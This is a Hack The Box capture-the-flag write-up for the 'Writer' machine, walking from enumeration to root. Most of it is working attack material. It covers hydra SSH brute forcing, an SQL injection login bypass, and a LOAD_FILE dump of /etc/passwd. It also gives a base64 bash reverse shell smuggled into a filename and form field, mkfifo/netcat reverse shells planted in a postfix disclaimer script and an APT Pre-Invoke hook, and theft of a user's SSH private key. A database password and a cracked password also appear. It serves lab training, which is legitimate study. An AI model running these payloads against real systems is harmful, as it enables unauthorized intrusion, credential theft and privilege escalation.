# Writer 10.10.11.101

Core Concepts:

- SMB Enumeration  
- SSH brute forcing  
- pspy64  
- Python code for sending mail  
- Privilege escalation  

## Enumeration

As is tradition, we begin with an nmap scan 

```
nmap -sV -sC 10.10.11.101 -o nmap.writer.txt
```

nmap reveals that ports 22 and 80 are open.  80 usually indicates a website so lets add writer.htb to /etc/hosts and browse to the site.

```
sudo nano /etc/hosts
```

add `10.10.11.101  writer.htb` to the list
now we can browse directly to *writer.htb* in firefox
lets get a good wordlist and use gobuster to enumerate all directories

```
wget https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/general/common.txt
gobuster dir -u http://writer.htb -w common.txt -o gobuster.writer.txt
```

gobuster reveals `/about` `/contact` and `/logout` subdirectories
it's likely if we use a larger wordlist we'll find more so lets get a bigger one and run gobuster again

```
wget https://raw.githubusercontent.com/3ndG4me/KaliLists/master/dirbuster/directories.jbrofuzz
gobuster dir -u http://writer.htb -w directories.jbrofuzz -o gobuster.jbrofuzz.writer.txt
```

As suspected with get a handful of additional directories with a bigger wordlist. In particular `/administrative` looks promising.
Browsing to `writer.htb/adminstrative` reveals a login portal as a possible attack vector.
Beforehand, let's finish our enumeration by seeing if we can find any smbshares.

```
smbmap -H 10.10.11.101 -R > smbmap.writer.txt
```

smbmap reveals 3 disks with no access. Let's try to get connected with rpcclient with null session authentication.

```
rpcclient -U "" -N 10.10.11.101
```

The connection is a success, let's enumerate the users.

```
┌──(taylor㉿DESKTOP-72GCBB0)-[~/Documents/Writer]
└─$ rpcclient -U "" -N 10.10.11.101
rpcclient $> enumdomusers
user:[kyle] rid:[0x3e8]
rpcclient $> queryuser kyle
        User Name   :   kyle
        Full Name   :   Kyle Travis
        Home Drive  :   \\writer\kyle
        Dir Drive   :
        Profile Path:   \\writer\kyle\profile
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 31 Dec 1969 16:00:00 PST
        Logoff Time              :      Wed, 06 Feb 2036 07:06:39 PST
        Kickoff Time             :      Wed, 06 Feb 2036 07:06:39 PST
        Password last set Time   :      Tue, 18 May 2021 10:03:35 PDT
        Password can change Time :      Tue, 18 May 2021 10:03:35 PDT
        Password must change Time:      Wed, 13 Sep 30828 19:48:05 PDT
        unknown_2[0..31]...
        user_rid :      0x3e8
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $> 
```

We got my boy Kyle Travis!
At this point I think we've garnered all we can from basic enumeration.  We've identified a potential attack vector at `/adminstrative` and some user credentials we might be able to use for an SSH brute force attack.  It's time to move on to...

## Foothold

Let's start with ssh bruteforcing our boy kyle.  First things first, download rockyou.txt from https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt. Then sick hydra on kyle with the rockyou.txt wordlist.  If you don't already 
have hydra just `sudo apt-get install hydra`.

``` 
hydra -l kyle -P rockyou.txt ssh://writer.htb -VV -f -t 60
```

After a few attempts it looks like the box is refusing ssh connections. Let's try SQL injection on the `/adminstration` subdomain
Let's use burpsuite to start poking around. Intercepting a post request with random creds to administration we see post are sent in the form:

```
POST /administrative HTTP/1.1
Host: 10.10.11.101
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.101
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.11.101/administrative
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

uname=admin&password=password
```

revealing that our user field is `uname` and password field is `password`, go ahead and save this (post.txt).  Let's see if this is vulnerable to injection.
First lets grab a payload.

```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt
```

Now let's s use the payload with ffuf to fuzz a post

```
ffuf -X POST -request post.txt -w Generic-SQLi.txt:UNAME -w Generic-SQLi.txt:PASS -t 200 -c -mode pitchfork -mc all -request-proto http -fs 790 > ffuf.sqli.writer.txt
```

Fuzzing reveals a littany of different sqlinjection you can use for logging in. We'll go with `*/*`. With that we've achieved our initial foothold. It's time for...

## Escalation

Enumerating the site a bit we find a `/stories` section which allows users to post text stories. This immediately jumps out as a potential 
code injection vector. Meanwhile, let's also run sqlmap on the site to see if we can find any other attack vectors.  First save a post request from burpsuite (r.txt).  Now run:

``` 
sqlmap -r r.txt --dbs --batch --level 5 --risk 3 > sqlmap.dbs.writer.txt
```

Now that we've revealed the `administrative` subdomain is vulnerable to sql injection let's open up burp and prepare a payload. 
Substitute admin and password fields with an SQL injection:

```
POST /administrative HTTP/1.1
Host: writer.htb
Content-Length: 81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://writer.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://writer.htb/administrative
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

uname=oops' UNION ALL SELECT 0,LOAD_FILE('/etc/passwd'),2,3,4,5; --&password=oops
```

No luck quite yet on the password getting dumped but we can see from the response that we can use this template to dump just about any file
we could want!

```
HTTP/1.1 200 OK
Date: Wed, 01 Dec 2021 22:44:56 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Cookie,Accept-Encoding
Set-Cookie: session=eyJ1c2VyIjoib29wcycgVU5JT04gQUxMIFNFTEVDVCAwLExPQURfRklMRSgnL2V0Yy9wYXNzd2QnKSwyLDMsNCw1OyAtLSJ9.Yaf66A.xmNOdOSJytfu8X9p7d5Bi4XSAFY; HttpOnly; Path=/
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 3332

<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="refresh" content="0.1; URL=/dashboard" />
    <title>Redirecting | Writer.HTB</title>
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="css/redirect.css" rel="stylesheet">
</head>

<body>
    <div class="wrapper">
        <div class="page vertical-align text-center">
            <div class="page-content vertical-align-middle">
                <header>
                    <h3 class="animation-slide-top">Welcome root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
john:x:1001:1001:,,,:/home/john:/bin/bash
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
</h3>
                </header>
                <p class="success-advise">Redirecting you to the dashboard. If you are not redirected then click the button below to be redirected.</p>
                <a class="btn btn-primary btn-round mb-5" href="/dashboard">CLICK HERE</a>
                <footer class="page-copyright">
                    <p>© Writer.HTB 2021. All RIGHT RESERVED.</p>
                </footer>
            </div>
        </div>
    </div>
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
</body>

</html>
```

let's generate a payloud for a reverse shell

```
echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.20/1234 0>&1'" | base64
```
>YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMC8xMjM0IDA+JjEn
```
touch '1.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMC8xMjM0IDA+JjEn | base64 -d | bash `;'
```

Before uploading the payload start a netcat listener.  I like to use rlwrap when I use netcat.

```
rlwrap nc -lvnp 1234
```

Now edit a story and add the package.  After uploading the package edit a story again and intercept the post request. Then edit the request with the local directory of the file. Ex.

```
------WebKitFormBoundaryW1Pu2dDRgk5rlBlP
Content-Disposition: form-data; name="image_url"

file:///var/www/writer.htb/writer/static/img/1.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMC8xMjM0IDA+JjEn | base64 -d | bash `;#
```

Finally, we should now have a shell on netcat!

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
ss -tupln
```

reveals that we have a mysql db

```
cd /etc/mysql
cat mariadb.cnf
```

Reveals some django user creds, sweet!

> user = djangouser
> password = DjangoSuperPassword

Log into mysql on the victim and poke around for user information

```
mysql -h 127.0.0.1
show databases;
use dev;
show tables
SELECT * FROM auth_user;
```

```
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
1 row in set (0.000 sec)
```

Finally we have a hash for kyle. Now let's crack it using johntheripper!

```
haschcat -a - -m 10000 hash.txt --wordlist rockyou.txt
```
>marcoantonio

Now ssh into the box with kyle's creds!

```
ssh kyle@writer.htb -p 22
cat user.txt
```

That's it for the user flag! Now it's time to get...

## Root Access

First let's explore kyle's access, our running processes and netstats.

```
kyle@writer:~$ ls -al
total 28
drwxr-xr-x 3 kyle kyle 4096 Aug  5 09:59 .
drwxr-xr-x 4 root root 4096 Jul  9 10:59 ..
lrwxrwxrwx 1 root root    9 May 18  2021 .bash_history -> /dev/null
-rw-r--r-- 1 kyle kyle  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 kyle kyle 3771 Feb 25  2020 .bashrc
drwx------ 2 kyle kyle 4096 Jul 28 09:03 .cache
-rw-r--r-- 1 kyle kyle  807 Feb 25  2020 .profile
-r-------- 1 kyle kyle   33 Dec  3 00:55 user.txt
```

```
kyle@writer:~$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
```

```
kyle@writer:~$ netstat -punta | grep LISTEN
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -   
```

Our enumeration reveals an SMTP protocol on port 25 `tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -` which could give us a window 
to some juicy exploits` 
For our final inspection we'll use PsPy64 to monitor linux processes without root permissions. But we have to get it onto the victims machine.  So let's clone it, start a python server, and 
see if we can use `wget` to retreive it from our machine.

On our Machine:

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
python -m SimpleHTTPServer
```

On victim:

```
kyle@writer:~$ wget http://10.10.14.20:8000/pspy64
--2021-12-03 15:21:41--  http://10.10.14.20:8000/pspy64
Connecting to 10.10.14.20:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                 100%[=========================>]   2.94M   848KB/s    in 3.9s    

2021-12-03 15:21:45 (775 KB/s) - ‘pspy64’ saved [3078592/3078592]
```

Next make pspy64 executable and well.... execute it

```
chmod +x pspy64
./pspy64
```

pspy reveals a disclaimer file that is to be sent from sender to receiver.  Sender being our current user.
> 2021/12/03 16:04:01 CMD: UID=0    PID=39174  | /usr/bin/cp /root/.scripts/disclaimer /etc/postfix/disclaimer
looks juicy, let's find and check it out.

```
$ find / -type f -group filter 2>/dev/null
/etc/postfix/disclaimer
nano /etc/postfix/disclaimer
```

The good news is this particular process is extremely exploitable.  That bad news is there's a cron job that is set to clear the script to the default state before running the code.  So let's hijack this process with a different script.

On our machine:

```
rlwrap nc -lvnp 8000
```

In the victims machine create a python mail script:

```
nano mail.py

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "10.10.14.20"
lport = 8000
rhost = "10.10.11.101"
rport = 2255 # 489,587

# create message object instance
msg = MIMEMultipart()


# setup the parameters of the message
password = "" 
msg['From'] = "kyle@write.htb"
msg['To'] = "john@write.htb"
msg['Subject'] = "This is not a drill!"

# payload 
message = ('asdasdasd')

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
    print("[-]Connection Error")
    exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```

Now comes the neat part, let's hijack the disclaimer:

```
nano /etc/postfix/disclaimer
```

add this line to the top of the disclaimer:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR IP> <PORT> >/tmp/f
```

now run your python script

```
python3 mail.py
```

and BAM! thanks john!

```
┌──(taylor㉿DESKTOP-72GCBB0)-[~/Documents/Writer]
└─$ rlwrap nc -lvnp 8000
Listening on 0.0.0.0 8000
Connection received on 10.10.11.101 51696
/bin/sh: 0: can't access tty; job control turned off
whoami
john
id
uid=1001(john) gid=1001(john) groups=1001(john)
```

Now let's nab some ssh keys and get a proper shell

```
cd /home/john/.ssh/
cat id_rsa
```

Don't be a newb, copy and paste the entire rsa key.  Dashes and everything. Then on our machine:

```
nano id_rsa
chmod 600 id_rsa
```

and copy and paste the entire key then >cntrl+x >y >enter. Now we should be able to simply ssh back into the victim.

```
┌──(taylor㉿DESKTOP-72GCBB0)-[~/Documents/Writer]
└─$ sudo ssh -i id_rsa john@10.10.11.101 -p 22
The authenticity of host '10.10.11.101 (10.10.11.101)' can't be established.
ED25519 key fingerprint is SHA256:EcmD06Im3Ox+/6cWwJX2eaLFPlgm/TO0Jw20KJK1XSw.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:11: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.101' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri  3 Dec 16:34:10 UTC 2021

  System load:  0.21              Processes:             256
  Usage of /:   64.9% of 6.82GB   Users logged in:       0
  Memory usage: 26%               IPv4 address for eth0: 10.10.11.101
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jul 28 09:19:58 2021 from 10.10.14.19
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```

let's run pspy again as john to get a handle on what's going on.  

Our machine:

```
python3 -m http.server
```

Victim:

```
wget 10.10.14.20:8000/pspy64
chmod +x pspy64
./pspy64
```

pspy reveals this process using apt

> 2021/12/03 16:38:01 CMD: UID=0    PID=40804  | /usr/bin/apt-get update 

We can exploit this process to finally get root! Let's start another netcat listener on our machine:

```
rlwrap nc -lvnp 1234
```

```
echo 'APT::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR IP> <PORT> >/tmp/f"};' > /etc/apt/apt.conf.d/shell
```

and........................................

```
┌──(taylor㉿DESKTOP-72GCBB0)-[~/Documents/Writer]
└─$ rlwrap nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.11.101 59084
/bin/sh: 0: can't access tty; job control turned off
whoami
root
```

Oh lawwwwwwwwwd.... that was a long one guys

# Congrats! Root Flag Captured!














